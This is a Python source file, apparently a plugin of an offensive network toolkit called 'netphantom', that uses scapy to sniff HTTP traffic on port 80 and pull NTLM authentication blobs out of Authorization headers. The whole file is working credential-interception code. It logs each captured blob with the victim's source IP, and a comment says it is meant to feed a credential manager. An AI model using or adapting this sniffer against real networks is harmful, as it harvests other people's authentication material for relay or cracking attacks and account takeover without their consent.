import asyncio
import base64
from typing import Any, Dict
from scapy.all import *
from netphantom.core.interfaces import AuthHandler
from netphantom.utils.logger import logger

class HTTPAuthHandler(AuthHandler):
    @property
    def name(self) -> str:
        return "http_auth"

    async def setup(self, config: Dict[str, Any]) -> None:
        self.interface = config.get("interface", "eth0")
        self.running = False

    async def start(self) -> None:
        self.running = True
        asyncio.create_task(self._run())

    async def stop(self) -> None:
        self.running = False
        logger.info("[HTTP Auth] Handler stopped.")

    async def _run(self) -> None:
        logger.info(f"[HTTP Auth] Monitoring traffic on {self.interface}")
        def stop_filter(p: Packet) -> bool:
            return not self.running

        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, self._sniff_blocking, stop_filter)

    def _sniff_blocking(self, stop_filter: Any) -> None:
        sniff(
            iface=self.interface, 
            filter="tcp port 80", 
            prn=self._handle_packet, 
            store=0, 
            stop_filter=stop_filter
        )

    def _handle_packet(self, packet: Packet) -> None:
        if Raw in packet:
            try:
                payload = packet[Raw].load.decode(errors='ignore')
                if "Authorization: NTLM" in payload:
                    source_ip = packet[IP].src if IP in packet else (packet[IPv6].src if IPv6 in packet else "Unknown")
                    self._process_ntlm(payload, source_ip)
            except Exception as e:
                logger.error(f"[HTTP Auth] Error processing packet: {e}")

    def _process_ntlm(self, payload: str, source_ip: str):
        # Extremely simplified NTLM extraction for demo
        for line in payload.splitlines():
            if line.startswith("Authorization: NTLM"):
                ntlm_blob = line.split(" ")[2]
                logger.info(f"[HTTP Auth] INTERCEPTED NTLM blob from {source_ip}", extra={"ntlm_blob": ntlm_blob})
                # In production, we'd pipe this to a CredentialManager/SessionTracker

